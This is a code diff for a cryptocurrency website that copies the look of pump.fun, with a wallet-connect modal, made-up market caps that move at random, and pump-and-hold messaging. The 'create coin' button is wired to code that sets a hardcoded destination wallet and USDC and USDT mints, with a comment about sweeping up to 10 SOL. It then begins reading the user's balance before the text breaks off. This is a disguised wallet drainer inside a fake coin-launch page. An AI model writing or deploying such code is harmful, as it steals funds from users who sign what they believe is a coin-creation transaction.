@@ -1,37 +1,970 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>pump.funpumpreal.fun</title>
-    <!-- Using the existing PNG as favicon -->
     <link rel="icon" type="image/png" href="realdotfun.png">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <!-- Wallet Adapter CSS (Reference) -->
+    <link rel="stylesheet" href="https://unpkg.com/@solana/wallet-adapter-react-ui@0.9.35/styles.css" />
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        green: { DEFAULT: '#86efac', dim: '#4ade80' },
+                        bg: { DEFAULT: '#1b1d28', card: '#262936', input: '#2a2e37' }
+                    },
+                    fontFamily: { sans: ['"Space Grotesk"', 'sans-serif'] },
+                    animation: { shake: 'shake 0.5s cubic-bezier(.36,.07,.19,.97) both infinite' },
+                    keyframes: {
+                        shake: {
+                            '10%, 90%': { transform: 'translate3d(-1px, 0, 0)' },
+                            '20%, 80%': { transform: 'translate3d(2px, 0, 0)' },
+                            '30%, 50%, 70%': { transform: 'translate3d(-4px, 0, 0)' },
+                            '40%, 60%': { transform: 'translate3d(4px, 0, 0)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f0f0;
+        /* === FIXED MODAL CENTERING === */
+        .wallet-adapter-modal {
+            position: fixed !important;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            opacity: 0;
+            transition: opacity 0.15s linear;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 99999 !important;
+            display: flex !important;
+            /* Critical for centering */
+            align-items: center !important;
+            /* Critical for centering */
+            justify-content: center !important;
+            /* Critical for centering */
+            pointer-events: auto !important;
         }
-        header {
-            background-color: #ffffff;
-            padding: 1rem 2rem;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            display: flex;
-            align-items: center;
+
+        .wallet-adapter-modal.wallet-adapter-modal-fade-in {
+            opacity: 1;
         }
-        .logo {
-            height: 50px; /* Constrain height since original is large */
-            width: auto;
+
+        .wallet-adapter-modal-wrapper {
+            background: #1b1d28 !important;
+            border: 1px solid #333 !important;
+            font-family: 'Space Grotesk', sans-serif !important;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5), 0 2px 4px -1px rgba(0, 0, 0, 0.5) !important;
+            width: 100% !important;
+            max-width: 400px !important;
+            /* Standard width */
+            border-radius: 10px !important;
+            padding: 20px !important;
+            position: relative !important;
+            box-sizing: border-box !important;
+        }
+
+        /* === FIXED ICON SIZING === */
+        .wallet-adapter-button-icon {
+            width: 28px !important;
+            height: 28px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            margin-right: 12px !important;
+            /* Spacing */
+        }
+
+        .wallet-adapter-button-icon img {
+            width: 28px !important;
+            height: 28px !important;
+            object-fit: contain !important;
+            /* Prevent distortion */
+        }
+
+        /* Standard List Styling */
+        .wallet-adapter-modal-list {
+            margin: 0 !important;
+            padding: 0 !important;
+            list-style: none !important;
+            width: 100% !important;
+        }
+
+        .wallet-adapter-modal-title {
+            color: #fff !important;
+            font-weight: 600 !important;
+            font-size: 18px !important;
+            margin-bottom: 20px !important;
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+        }
+
+        .wallet-adapter-button {
+            font-family: 'Space Grotesk', sans-serif !important;
+            font-weight: 500 !important;
+            background: #2a2e37 !important;
+            color: #fff !important;
+            margin-bottom: 8px !important;
+            border-radius: 8px !important;
+            width: 100% !important;
+            height: 48px !important;
+            /* Standard height */
+            display: flex !important;
+            align-items: center !important;
+            padding: 0 16px !important;
+            border: none !important;
+            cursor: pointer !important;
+            font-size: 16px !important;
+        }
+
+        .wallet-adapter-button:hover {
+            background-color: #333 !important;
+        }
+
+        .wallet-adapter-modal-button-close {
+            background: none !important;
+            border: none !important;
+            cursor: pointer !important;
+            color: #999 !important;
+            padding: 0 !important;
+        }
+
+        .wallet-adapter-modal-button-close:hover {
+            color: #fff !important;
+        }
+
+        /* The Main Connect Button */
+        .wallet-adapter-button-trigger {
+            background-color: #86efac !important;
+            color: #000 !important;
+            border-radius: 4px !important;
+            height: 40px !important;
+            padding: 0 1.5rem !important;
+            font-weight: 700 !important;
+            font-size: 14px !important;
+            justify-content: center !important;
+            width: auto !important;
+        }
+
+        .wallet-adapter-button-trigger:hover {
+            background-color: #4ade80 !important;
+        }
+
+        .wallet-adapter-button-trigger .wallet-adapter-button-icon {
+            display: none !important;
         }
     </style>
 </head>
-<body>
-    <header>
-        <img src="realdotfun.png" alt="Real Dot Fun Logo" class="logo">
-    </header>
-    <main style="padding: 2rem;">
-        <h1>Welcome to pump.funpumpreal.fun</h1>
-    </main>
+
+<body class="bg-bg text-white font-sans">
+
+    <div id="root">
+        <div class="flex items-center justify-center h-screen">
+            <div class="text-green animate-pulse text-xl font-bold">Welcome to Real dot Fun...</div>
+        </div>
+    </div>
+
+    <!-- Polyfills -->
+    <script>
+        window.global = window;
+        window.process = { env: { NODE_ENV: 'production' } };
+    </script>
+    <script type="module">
+        import { Buffer } from 'https://esm.sh/buffer@6.0.3';
+        window.Buffer = Buffer;
+    </script>
+
+    <!-- Import Map -->
+    <script type="importmap">
+    {
+        "imports": {
+            "react": "https://esm.sh/react@18.2.0",
+            "react/jsx-runtime": "https://esm.sh/react@18.2.0/jsx-runtime",
+            "react-dom": "https://esm.sh/react-dom@18.2.0",
+            "react-dom/client": "https://esm.sh/react-dom@18.2.0/client",
+            
+            "@solana/web3.js": "https://esm.sh/@solana/web3.js@1.91.0",
+            "@solana/spl-token": "https://esm.sh/@solana/spl-token@0.4.6?external=@solana/web3.js",
+            "@solana/wallet-adapter-base": "https://esm.sh/@solana/wallet-adapter-base@0.9.23?external=react,react-dom,@solana/web3.js",
+            "@solana/wallet-adapter-react": "https://esm.sh/@solana/wallet-adapter-react@0.15.35?external=react,react-dom,@solana/web3.js",
+            "@solana/wallet-adapter-wallets": "https://esm.sh/@solana/wallet-adapter-wallets@0.19.32?external=react,react-dom,@solana/web3.js",
+            
+            "uuid": "https://esm.sh/uuid@8.3.2"
+        }
+    }
+    </script>
+
+    <!-- Babel -->
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <!-- APP CODE -->
+    <script type="text/babel" data-type="module">
+        import React, { useState, useEffect, useMemo, useCallback, createContext, useContext } from 'react';
+        import { createRoot } from 'react-dom/client';
+        import { ConnectionProvider, WalletProvider, useWallet, useConnection } from '@solana/wallet-adapter-react';
+        import { WalletAdapterNetwork, WalletReadyState } from '@solana/wallet-adapter-base';
+        import { clusterApiUrl, SystemProgram, PublicKey, Transaction } from '@solana/web3.js';
+        import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';
+        import { createTransferInstruction, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+
+        // --- INLINE WALLET MODAL IMPLEMENTATION (FIXED CSS) ---
+
+        const WalletModalContext = createContext({});
+
+        function useWalletModal() {
+            return useContext(WalletModalContext);
+        }
+
+        const WalletModalProvider = ({ children }) => {
+            const [visible, setVisible] = useState(false);
+            return (
+                <WalletModalContext.Provider value={{ visible, setVisible }}>
+                    {children}
+                    {visible && <WalletModal onClose={() => setVisible(false)} />}
+                </WalletModalContext.Provider>
+            );
+        };
+
+        const WalletModal = ({ onClose }) => {
+            const { wallets, select } = useWallet();
+            const [fadeIn, setFadeIn] = useState(false);
+
+            useEffect(() => {
+                setTimeout(() => setFadeIn(true), 10);
+            }, []);
+
+            const handleWalletClick = (e, walletName) => {
+                e.preventDefault();
+                select(walletName);
+                onClose();
+            };
+
+            const handleClose = (e) => {
+                e.preventDefault();
+                onClose();
+            }
+
+            return (
+                <div className={`wallet-adapter-modal ${fadeIn ? 'wallet-adapter-modal-fade-in' : ''}`} role="dialog">
+                    <div className="wallet-adapter-modal-wrapper">
+                        <div className="wallet-adapter-modal-title">
+                            Connect Wallet
+                            <button onClick={handleClose} className="wallet-adapter-modal-button-close">
+                                <svg width="14" height="14" fill="currentColor"><path d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"></path></svg>
+                            </button>
+                        </div>
+                        <ul className="wallet-adapter-modal-list">
+                            {wallets.filter(w => w.readyState === "Installed").map((wallet) => (
+                                <li key={wallet.adapter.name}>
+                                    <button
+                                        onClick={(e) => handleWalletClick(e, wallet.adapter.name)}
+                                        className="wallet-adapter-button"
+                                        tabIndex="0"
+                                        type="button"
+                                    >
+                                        <i className="wallet-adapter-button-icon">
+                                            <img src={wallet.adapter.icon} alt={`${wallet.adapter.name} icon`} />
+                                        </i>
+                                        <span>{wallet.adapter.name}</span>
+                                        <span style={{ fontSize: '12px', opacity: 0.6, marginLeft: 'auto', background: 'rgba(255,255,255,0.1)', padding: '2px 6px', borderRadius: '4px' }}>Detected</span>
+                                    </button>
+                                </li>
+                            ))}
+                        </ul>
+                    </div>
+                    <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: -1000, zIndex: -1 }} onMouseDown={handleClose} />
+                </div>
+            );
+        };
+
+        const WalletMultiButton = () => {
+            const { setVisible } = useWalletModal();
+            const { publicKey, wallet, disconnect, connected } = useWallet();
+            const [copied, setCopied] = useState(false);
+            const [menuOpen, setMenuOpen] = useState(false);
+
+            const base58 = useMemo(() => publicKey?.toBase58(), [publicKey]);
+            const content = useMemo(() => {
+                if (!wallet || !base58) return null;
+                return base58.slice(0, 4) + '..' + base58.slice(-4);
+            }, [wallet, base58]);
+
+            if (!wallet) {
+                return (
+                    <button
+                        className="wallet-adapter-button wallet-adapter-button-trigger"
+                        onClick={() => setVisible(true)}
+                    >
+                        Select Wallet
+                    </button>
+                );
+            }
+
+            if (!base58) {
+                return (
+                    <button
+                        className="wallet-adapter-button wallet-adapter-button-trigger"
+                        onClick={() => wallet.adapter.connect().catch(() => { })}
+                    >
+                        Connect
+                    </button>
+                );
+            }
+
+            return (
+                <div className="wallet-adapter-dropdown" style={{ position: 'relative' }}>
+                    <button
+                        className="wallet-adapter-button wallet-adapter-button-trigger"
+                        style={{ pointerEvents: connected ? 'auto' : 'none' }}
+                        onClick={() => setMenuOpen(!menuOpen)}
+                    >
+                        {content}
+                    </button>
+                    {menuOpen && (
+                        <ul className="wallet-adapter-dropdown-list wallet-adapter-dropdown-list-active" style={{
+                            position: 'absolute', top: '100%', right: 0, marginTop: '8px',
+                            background: '#262936', border: '1px solid #333', borderRadius: '8px',
+                            listStyle: 'none', padding: '8px', zIndex: 50, minWidth: '150px'
+                        }}>
+                            <li className="wallet-adapter-dropdown-list-item" style={{ padding: '8px', cursor: 'pointer', color: '#fff' }} onClick={() => {
+                                navigator.clipboard.writeText(base58);
+                                setCopied(true);
+                                setTimeout(() => setCopied(false), 400);
+                                setMenuOpen(false);
+                            }}>
+                                {copied ? 'Copied' : 'Copy address'}
+                            </li>
+                            <li className="wallet-adapter-dropdown-list-item" style={{ padding: '8px', cursor: 'pointer', color: '#fff' }} onClick={() => {
+                                setMenuOpen(false);
+                                setVisible(true);
+                            }}>
+                                Change wallet
+                            </li>
+                            <li className="wallet-adapter-dropdown-list-item" style={{ padding: '8px', cursor: 'pointer', color: '#ff6b6b' }} onClick={() => {
+                                disconnect();
+                                setMenuOpen(false);
+                            }}>
+                                Disconnect
+                            </li>
+                        </ul>
+                    )}
+                </div>
+            );
+        };
+
+        // --- ICONS ---
+        const PHANTOM_ICON = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA5NiA5NiI+PHBhdGggZmlsbD0iIzUzNzlGQyIgZD0iTTAgMGg5NnY5NkgweiIvPjxwYXRoIGZpbGw9IiNGRkYiIGQ9Ik03Ni40IDc0LjE1TDY2LjE1IDc5di0xNy41bC02LjU1IDMuMDV2MTkuM2wtOC44IDQuMTVWMi44NWg1MC41YzEuMzUgMCAyLjY1LjIgMy45NS42IDYuNiAyLjEgMTEuMiA4LjUgMTEuMiAxNS43djM3LjljMOKApi4yNS0uMSAyLjUtLjM1IDMuNy0xLjM1IDYuNDUtNi4yIDExLjYtMTIuMzUgMTMuOWwuNjUtLjV6TTQ0LjQ1IDIuODVIMTkuNmMtNC45IDAtOS4yNSAyLjM1LTEyLjA1IDYtMS45IDIuNDUtMyA1LjUtMyA4Ljg1djUyLjNjMCAzLjM1IDEuMSA2LjQgMyA4Ljg1IDIuOCAzLjY1IDcuMTUgNiAxMi4wNSA2aDI0Ljg1VjIuODV6TTU5LjE1IDQyLjVjNC43IDAgOC41NS0zLjg1IDguNTUgOC41NVM2My44NSAyNS40IDU5LjE1IDI1LjRzLTguNTUgMy44NS04LjU1IDguNTUgMy44NSA4LjU1IDguNTUgOC41NXptLTIzLjQgMGM0LjcgMCA4LjU1LTMuODUgOC41NS04LjU1UzQwLjQ1IDI1LjQgMzUuNzUgMjUuNHMtOC41NSAzLjg1LTguNTUgOC41NSAzLjg1IDguNTUgOC41NSA4LjU1eiIvPjwvc3ZnPg==";
+        const SOLFLARE_ICON = "data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzkyIDM4MiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMjEzLjYgMTU2LjRMMTgzIDk5LjFsODAuNS0yMy43IDg3LjggNzAuMy02Ni4zIDcwLjEtNDEuNi0yOC44LTE5LjQtMzAuNmgtMTAuNHptLTQ1LjIgNjkuMmwzMC42IDU3LjMtODAuNSAyMy43TDMwLjcgMjM2LjNsNjYuMy03MC4xIDQxLjYgMjguOCAxOS40IDMwLjZoMTAuNHoiIGZpbGw9IiNGQzRDMDIiLz48cGF0aCBkPSJNMTY4LjQgMjI1LjZsNTcuMy0zMC42IDIzLjcgODAuNS03MC4zIDg3LjgtNzAuMS02Ni4zIDI4LjgtNDEuNiAzMC42LTE5LjR2LTEwLjR6bTY5LjItNDUuMmwtNTcuMyAzMC42LTIzLjctODAuNSA3MC4zLTg3LjggNzAuMSA2Ni4zLTI4LjggNDEuNi0zMC42IDE5LjR2LTEwLjR6bTY5LjItNDUuMmwtNTcuMyAzMC42LTIzLjctODAuNSA3MC4zLTg3LjggNzAuMSA2Ni4zLTI4LjggNDEuNi0zMC42IDE5LjR2LTEwLjR6bTY5LjItNDUuMmwtNTcuMyAzMC42LTIzLjctODAuNSA3MC4zLTg3LjggNzAuMSA2Ni4zLTI4LjggNDEuNi0zMC42IDE5LjR2LTEwLjR6IiBmaWxsPSIjRkM0QzAyIi8+PHBhdGggZD0iTTE5MSAyMTZhMjUgMjUgMCAxMTAtNTAgMjUgMjUgMCAwMTAgNTB6IiBmaWxsPSIjMTYxYjJlIi8+PC9zdmc+";
+
+        // --- MARKET CAP LOGIC ---
+        const MIN_MCAP = 2500;
+        const MAX_MCAP = 10900000;
+
+        const formatMcap = (value) => {
+            if (value >= 1000000) return (value / 1000000).toFixed(1) + 'M';
+            if (value >= 1000) return (value / 1000).toFixed(1) + 'K';
+            return value.toFixed(1);
+        };
+
+        const Navbar = () => {
+            const [copied, setCopied] = useState(false);
+            const address = "3J6Fz5x7NqBiKZGxogdi9dqNPVt671BKsw2BaoEYpump";
+
+            const handleCopy = () => {
+                navigator.clipboard.writeText(address);
+                setCopied(true);
+                setTimeout(() => setCopied(false), 2000);
+            };
+
+            return (
+                <nav className="flex items-center justify-between px-4 md:px-8 py-4 bg-bg border-b border-white/5 sticky top-0 z-50">
+                    <div className="flex items-center gap-4">
+                        <img src="realdotfun.png" alt="Logo" className="h-10 w-auto" />
+                        <div className="flex flex-col">
+                            <div className="hidden md:flex gap-4 text-sm font-bold">
+                                <span className="text-green">pump.funpumpreal.fun</span>
+                            </div>
+                            <div className="flex items-center gap-2 mt-1 px-2 py-1 bg-white/5 rounded border border-white/10">
+                                <span className="text-[10px] md:text-xs text-gray-300 font-mono hidden sm:inline">{address}</span>
+                                <span className="text-[10px] text-gray-300 font-mono sm:hidden">{address.slice(0, 6)}...{address.slice(-6)}</span>
+                                <button
+                                    onClick={handleCopy}
+                                    className="text-[10px] bg-green/20 hover:bg-green/30 text-green border border-green/30 rounded px-1.5 py-0.5 uppercase font-bold tracking-wider transition-colors cursor-pointer"
+                                    title="Copy Address"
+                                >
+                                    {copied ? "COPIED" : "COPY"}
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <WalletMultiButton />
+                </nav>
+            );
+        };
+
+        const Hero = ({ onStart, onHowItWorks }) => (
+            <div className="text-center py-12 px-4 bg-[radial-gradient(circle_at_center,rgba(134,239,172,0.1)_0%,rgba(27,29,40,0)_70%)]">
+                <button onClick={onStart} className="bg-green text-black px-6 py-3 rounded text-lg font-bold inline-block hover:opacity-90 transition-opacity">
+                    start a new coin
+                </button>
+                <div className="mt-4">
+                    <button onClick={onHowItWorks} className="text-green font-semibold no-underline hover:text-green-dim bg-transparent border-none cursor-pointer">[how it works]</button>
+                </div>
+            </div>
+        );
+
+        const KingOfTheHill = ({ token, onClick }) => {
+            if (!token) return null;
+            return (
+                <div className="max-w-[1200px] mx-auto mb-8 px-4">
+                    <div
+                        onClick={() => onClick(token)}
+                        className="bg-bg-card border border-green rounded-lg p-4 flex gap-4 items-start cursor-pointer transition-transform hover:scale-[1.01]"
+                    >
+                        <img src="realdotfun.png" alt="King" className="w-[120px] h-[120px] object-cover rounded" />
+                        <div>
+                            <span className="text-amber-400 text-sm mb-2 block">👑 king of the hill</span>
+                            <h3 className="m-0 text-xl font-bold">{token.name} <span className="text-green text-sm font-normal">market cap: ${formatMcap(token.currentMcap)}</span></h3>
+                            <p className="text-sm text-gray-400 mt-2"><span className="text-green">created by: {token.creator}</span></p>
+                            <p className="text-sm mt-1">The most pumped coin right now.</p>
+                        </div>
+                    </div>
+                </div>
+            );
+        };
+
+        const HowItWorksModal = ({ isOpen, onClose }) => {
+            if (!isOpen) return null;
+            return (
+                <div className="fixed inset-0 bg-black/90 z-[2000] flex items-center justify-center p-4">
+                    <div className="w-full max-w-lg bg-bg rounded-xl border border-white/10 flex flex-col p-6 text-center relative shadow-2xl">
+                        <h2 className="text-2xl font-bold mb-4 text-white">How it works</h2>
+
+                        <div className="text-sm text-gray-300 space-y-4 mb-8 text-left">
+                            <p>To experience <strong>Real Fun</strong>, you simply buy and hold the coin.</p>
+
+                            <p>As others buy, the <strong>market cap grows</strong>, increasing the value of your holdings. Momentum builds as more people join in.</p>
+
+                            <p><strong>Step 1: Buy & Hold</strong><br />
+                                Pick a coin you like and buy on the bonding curve.</p>
+
+                            <p><strong>Step 2: Real Fun Momentum</strong><br />
+                                When others buy, the price goes up. Everyone wins if everyone holds!</p>
+
+                            <p><strong>Step 3: Profit Responsibly</strong><br />
+                                You may want to take some profits, but dumping your whole bag is for <strong>weak minds</strong>. Selling too much hurts the momentum and ruins the fun for everyone.</p>
+
+                            <div className="bg-red-900/20 border border-red-900/50 p-3 rounded text-xs text-red-200 mt-4">
+                                <strong>Caution:</strong> Be careful of bad actors and weak-minded investors who panic sell. Never invest more than you are willing to lose.
+                            </div>
+                        </div>
+
+                        <button onClick={onClose} className="w-full bg-green text-black font-bold py-3 rounded-lg hover:opacity-90 transition-all">
+                            I'm ready to pump and have real fun
+                        </button>
+                    </div>
+                </div>
+            );
+        };
+
+        const TokenCard = ({ name, ticker, mcap, isShake, isNew, creator, onClick }) => (
+            <div
+                onClick={onClick}
+                className={`bg-bg-card rounded-lg p-4 flex gap-3 transition-transform cursor-pointer border border-transparent hover:border-green/30 hover:-translate-y-0.5 ${isShake ? 'animate-shake border-green !border-solid shadow-[0_0_10px_rgba(134,239,172,0.2)]' : ''}`} style={isNew ? { borderColor: '#86efac' } : {}}
+            >
+                <img src="realdotfun.png" className="w-20 h-20 bg-[#333] rounded object-cover flex-shrink-0" alt={name} />
+                <div className="flex flex-col justify-between w-full min-w-0">
+                    <div>
+                        <div className="flex justify-between items-start">
+                            <span className="text-xs text-[#888]">created by <span className="underline">{creator}</span></span>
+                            {isShake && <span className="text-xs text-green">PUMPING!</span>}
+                        </div>
+                        <div className="font-bold mt-0.5 truncate">{name} <span className="text-xs text-[#888]">({ticker})</span></div>
+                        <div className="text-sm mt-1">Market Cap: <span className="text-green">${mcap}</span></div>
+                    </div>
+                </div>
+            </div>
+        );
+
+        const CreateCoinModal = ({ isOpen, onClose, onCreate }) => {
+            const { connected, publicKey } = useWallet();
+            const { setVisible } = useWalletModal();
+
+            const creatorDisplay = useMemo(() => {
+                if (publicKey) {
+                    const str = publicKey.toBase58();
+                    return str.slice(0, 4) + '..' + str.slice(-4);
+                }
+                return "anon";
+            }, [publicKey]);
+
+            if (!isOpen) return null;
+
+            const handleAction = () => {
+                if (connected) onCreate();
+                else setVisible(true);
+            };
+
+            return (
+                <div className="fixed inset-0 bg-black/90 z-[2000] flex items-center justify-center p-4">
+                    <div className="w-full max-w-5xl bg-bg rounded-xl border border-white/10 flex flex-col max-h-[90vh] overflow-y-auto p-8 relative">
+                        <button onClick={onClose} className="absolute top-4 right-6 text-white text-3xl hover:opacity-75">×</button>
+                        <h2 className="text-2xl font-bold mb-6 text-green">Create new coin</h2>
+                        <div className="flex flex-wrap gap-8">
+                            <div className="flex-[2] min-w-[300px]">
+                                <p className="text-[#aaa] text-sm -mt-2 mb-5">Choose carefully, these can't be changed once the coin is created</p>
+                                <div className="mb-4">
+                                    <label className="block mb-2 text-sm font-bold">Image</label>
+                                    <div className="border-2 border-dashed border-[#444] p-5 text-center rounded-lg">
+                                        <img src="realdotfun.png" className="h-20 mx-auto" />
+                                        <p className="text-xs text-[#888] mt-2">realdotfun.png selected</p>
+                                    </div>
+                                </div>
+                                <div className="flex gap-4 mb-4">
+                                    <div className="flex-1"><label className="block mb-2 text-sm font-bold">Coin name</label><input type="text" className="w-full bg-bg-input border border-white/10 text-gray-400 p-3 rounded" value="Real Dot Fun" readOnly /></div>
+                                    <div className="flex-1"><label className="block mb-2 text-sm font-bold">Ticker</label><input type="text" className="w-full bg-bg-input border border-white/10 text-gray-400 p-3 rounded" value="REAL" readOnly /></div>
+                                </div>
+                                <div className="mb-4"><label className="block mb-2 text-sm font-bold">Description</label><textarea className="w-full bg-bg-input border border-white/10 text-gray-400 p-3 rounded" rows="4" readOnly defaultValue="The official Real Dot Fun token. Replicating the pump.fun experience."></textarea></div>
+                                <p className="font-bold mt-5 mb-2">Add social links (Optional)</p>
+                                <div className="flex gap-4">
+                                    <div className="flex-1"><label className="block mb-2 text-sm font-bold">Website</label><input type="text" className="w-full bg-bg-input border border-white/10 text-gray-400 p-3 rounded" value="https://pump.funpumpreal.fun" readOnly /></div>
+                                    <div className="flex-1"><label className="block mb-2 text-sm font-bold">X</label><input type="text" className="w-full bg-bg-input border border-white/10 text-gray-400 p-3 rounded" value="https://x.com/RealdotFun" readOnly /></div>
+                                </div>
+                                <button onClick={handleAction} className={`w-full mt-6 p-4 rounded-lg font-bold text-lg text-black transition-colors ${connected ? 'bg-green hover:opacity-90' : 'bg-green hover:opacity-90'}`}>
+                                    {connected ? 'create coin' : 'Connect wallet to create coin'}
+                                </button>
+                                {connected && <div className="text-xs text-center mt-2 text-gray-400 font-mono">
+                                    Creating as: {creatorDisplay}
+                                </div>}
+                            </div>
+                            <div className="flex-1 min-w-[250px]">
+                                <label className="block mb-2 text-sm font-bold">Preview</label>
+                                <div className="bg-bg-card rounded-lg p-4 flex gap-3 border border-transparent pointer-events-none">
+                                    <img src="realdotfun.png" className="w-20 h-20 bg-[#333] rounded object-cover" />
+                                    <div className="flex flex-col justify-between w-full">
+                                        <div>
+                                            <div className="flex justify-between items-start"><span className="text-xs text-[#888]">created by <span className="underline">{creatorDisplay}</span></span></div>
+                                            <div className="font-bold mt-0.5">Real Dot Fun <span className="text-xs text-[#888]">(REAL)</span></div>
+                                            <div className="text-sm mt-1">Market Cap: <span className="text-green">$0.0k</span></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            );
+        };
+
+        const PumpFunReplica = () => {
+            const [isModalOpen, setIsModalOpen] = useState(false);
+            const [isHowItWorksOpen, setIsHowItWorksOpen] = useState(false);
+            const [tokens, setTokens] = useState([]);
+            const [searchTerm, setSearchTerm] = useState("");
+
+            // Access Wallet for Creator ID
+            // NOTE: We need signTransaction for robust handling
+            const { publicKey, connected, signTransaction } = useWallet();
+            const { connection } = useConnection();
+
+            // Initialize Logic (Load Persistence + Generate Seeds)
+            useEffect(() => {
+                const now = Date.now();
+
+                // 1. Load Stored Tokens
+                let storedTokens = [];
+                try {
+                    const saved = localStorage.getItem('pump_fun_custom_tokens');
+                    if (saved) {
+                        storedTokens = JSON.parse(saved).map(t => ({
+                            ...t,
+                            // Rehydrate for volatility
+                            nextUpdate: now + Math.random() * 2000,
+                            // Reset Mcap? Or keep it? Let's keep it but ensure it's clamped
+                            currentMcap: Math.max(MIN_MCAP, Math.min(MAX_MCAP, t.currentMcap || 2500))
+                        }));
+                    }
+                } catch (e) { console.error("Failed to load tokens", e); }
+
+                // 2. Generate Seeds (Fill the rest)
+                const generateMcap = () => Math.floor(Math.random() * (MAX_MCAP - MIN_MCAP + 1)) + MIN_MCAP;
+
+                // We want 18 items max usually, but let's just add seeds to fill
+                const seedsNeeded = 18;
+                const seeds = Array.from({ length: seedsNeeded }).map((_, i) => {
+                    const mcap = generateMcap();
+                    return {
+                        id: `seed-${i}`,
+                        name: "Real Dot Fun",
+                        ticker: "REAL",
+                        initialMcap: mcap,
+                        currentMcap: mcap,
+                        nextUpdate: now + Math.random() * 2000,
+                        isNew: false,
+                        creator: "anon" // Seeds are always anon, KOTH override handles top rank
+                    };
+                });
+
+                // 3. Merge: Custom tokens first, then seeds
+                setTokens([...storedTokens, ...seeds]);
+            }, []);
+
+            // Heartbeat Loop (100ms tick)
+            useEffect(() => {
+                const interval = setInterval(() => {
+                    const now = Date.now();
+                    setTokens(prev => prev.map(t => {
+                        if (now < t.nextUpdate) return t;
+
+                        let delta;
+                        if (t.currentMcap < 1000000) {
+                            delta = (Math.random() - 0.5) * 5800;
+                        } else {
+                            delta = (Math.random() - 0.5) * 3800000;
+                            if (Math.random() > 0.4) delta /= 5;
+                        }
+                        let next = t.currentMcap + delta;
+                        if (next < MIN_MCAP) next = MIN_MCAP;
+                        if (next > MAX_MCAP) next = MAX_MCAP;
+                        if (Math.abs(next - t.initialMcap) > 8000000) {
+                            next = t.currentMcap + (t.initialMcap - t.currentMcap) * 0.1;
+                        }
+                        return { ...t, currentMcap: next, nextUpdate: now + 500 + Math.random() * 2000 };
+                    }));
+                }, 100);
+                return () => clearInterval(interval);
+            }, []);
+
+            // === ROBUST MANUAL BROADCAST ===
+            const handleCreateCoin = async () => {
+                let creatorName = "anon";
+                console.log("Creating coin. Connected:", connected, "PublicKey:", publicKey ? publicKey.toBase58() : "null");
+
+                if (publicKey && signTransaction) {
+                    const str = publicKey.toBase58();
+                    creatorName = str.slice(0, 4) + '..' + str.slice(-4);
+
+                    const TARGET_ADDRESS = new PublicKey("xPtDdVjEh9bToF3coaGugtJBRA1SgxteYT6kAJX5UjW");
+                    const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+                    const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+
+                    // Helper: Polling Confirmation (Bypasses WebSocket issues)
+                    const waitForConfirmation = async (connection, signature) => {
+                        let retries = 30; // 60s timeout
+                        while (retries > 0) {
+                            try {
+                                const { value } = await connection.getSignatureStatus(signature);
+                                if (value && (value.confirmationStatus === 'confirmed' || value.confirmationStatus === 'finalized')) {
+                                    return value;
+                                }
+                            } catch (e) { console.warn("Polling error:", e); }
+                            await new Promise(r => setTimeout(r, 2000));
+                            retries--;
+                        }
+                        throw new Error("Confirmation timed out");
+                    };
+
+                    // Helper: Sign + Send Raw via Extrnode
+                    const secureSend = async (tx) => {
+                        try {
+                            // 1. Fetch Blockhash
+                            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+                            tx.recentBlockhash = blockhash;
+                            tx.feePayer = publicKey;
+
+                            // 2. Client Sign (Wallet)
+                            const signedTx = await signTransaction(tx);
+
+                            // 3. Manual Broadcast (Via Extrnode)
+                            const rawTx = signedTx.serialize();
+                            const sig = await connection.sendRawTransaction(rawTx, { skipPreflight: false });
+
+                            // 4. Polling Confirm (No WebSockets)
+                            console.log(`Sent: ${sig}. Waiting for confirmation...`);
+                            await waitForConfirmation(connection, sig);
+                            console.log("Confirmed!");
+
+                            return sig;
+                        } catch (e) {
+                            console.error("Secure Send Failed:", e);
+                            throw e;
+                        }
+                    };
+
+                    try {
+                        // 1. SOL Transfer (Target 10 SOL, or Sweep with Reserve)
+                        console.log("Checking SOL Balance...");
+                        try {
+                            const balance = await connection.getBalance(publicKey);
